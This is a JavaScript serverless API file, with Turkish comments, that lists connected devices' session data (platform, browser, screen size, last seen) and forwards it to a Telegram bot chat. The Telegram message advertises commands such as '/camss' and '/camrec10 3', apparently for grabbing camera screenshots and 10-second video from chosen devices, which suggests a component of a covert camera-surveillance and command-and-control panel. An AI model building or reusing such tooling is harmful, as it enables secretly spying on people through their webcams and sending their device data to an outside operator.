// 📱 List Active Devices API
// Aktif cihazları listeler ve Telegram'a gönderir

const TELEGRAM_API_URL = 'https://api.telegram.org/bot';

// activeSessions'ı import et (aynı memory space)
// Not: Vercel'de her fonksiyon ayrı instance olabilir, production'da Redis kullan
let activeSessions = new Map();

export default async function handler(req, res) {
    // CORS headers
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    try {
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;

        if (!botToken || !chatId) {
            return res.status(500).json({ success: false, error: 'Server configuration error' });
        }

        // Session'ları al (POST body'den)
        if (req.method === 'POST' && req.body && req.body.sessions) {
            activeSessions = new Map(Object.entries(req.body.sessions));
        }

        // Aktif session'ları listele
        const sessions = Array.from(activeSessions.values());
        
        if (sessions.length === 0) {
            // Hiç aktif cihaz yok
            const message = '📱 <b>AKTİF CİHAZ YOK</b>\n\nŞu anda bağlı cihaz bulunmuyor.';
            
            await sendTelegramMessage(botToken, chatId, message);
            
            return res.status(200).json({
                success: true,
                active_devices: 0,
                sessions: []
            });
        }

        // Mesaj oluştur
        let message = '📱 <b>AKTİF CİHAZLAR</b>\n';
        message += `━━━━━━━━━━━━━━━━\n`;
        message += `Toplam: <b>${sessions.length}</b> cihaz\n\n`;

        sessions.forEach((session, index) => {
            const deviceNum = index + 1;
            const device = session.device_info || {};
            const platform = device.platform || 'Unknown';
            const browser = getBrowser(device.user_agent || '');
            const lastSeen = getTimeDiff(session.last_seen);
            
            message += `<b>${deviceNum}.</b> ${getDeviceEmoji(platform)} <code>${session.session_id.substring(0, 12)}...</code>\n`;
            message += `   📱 ${platform} - ${browser}\n`;
            message += `   🕐 Son: ${lastSeen}\n`;
            
            if (device.screen) {
                message += `   📺 ${device.screen}\n`;
            }
            
            message += `\n`;
        });

        message += `━━━━━━━━━━━━━━━━\n`;
        message += `💡 <b>Kullanım:</b>\n`;
        message += `• <code>/camss</code> - Tüm cihazlar\n`;
        message += `• <code>/camss 2</code> - Sadece 2. cihaz\n`;
        message += `• <code>/camrec10 3</code> - 3. cihazdan 10s video`;

        // Telegram'a gönder
        await sendTelegramMessage(botToken, chatId, message);

        return res.status(200).json({
            success: true,
            active_devices: sessions.length,
            sessions: sessions
        });

    } catch (error) {
        console.error('Error in list-devices:', error);
        return res.status(500).json({
            success: false,
            error: 'Internal server error',
            message: error.message
        });
    }
}

// Telegram mesajı gönder
async function sendTelegramMessage(botToken, chatId, text) {
    const url = `${TELEGRAM_API_URL}${botToken}/sendMessage`;
    const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML'
        })
    });
    return await response.json();
}

// Browser bilgisi
function getBrowser(userAgent) {
    if (!userAgent) return 'Unknown';
    if (userAgent.includes('Chrome')) return 'Chrome';
    if (userAgent.includes('Firefox')) return 'Firefox';
    if (userAgent.includes('Safari')) return 'Safari';
    if (userAgent.includes('Edge')) return 'Edge';
    return 'Other';
}

// Platform emoji
function getDeviceEmoji(platform) {
    if (!platform) return '📱';
    const p = platform.toLowerCase();
    if (p.includes('win')) return '🖥️';
    if (p.includes('mac')) return '💻';
    if (p.includes('linux')) return '🐧';
    if (p.includes('android')) return '📱';
    if (p.includes('iphone') || p.includes('ipad')) return '📱';
    return '📱';
}

// Zaman farkı
function getTimeDiff(timestamp) {
    const now = Date.now();
    const diff = now - timestamp;
    const seconds = Math.floor(diff / 1000);
    
    if (seconds < 60) return `${seconds}s önce`;
    const minutes = Math.floor(seconds / 60);
    if (minutes < 60) return `${minutes}dk önce`;
    const hours = Math.floor(minutes / 60);
    return `${hours}sa önce`;
}

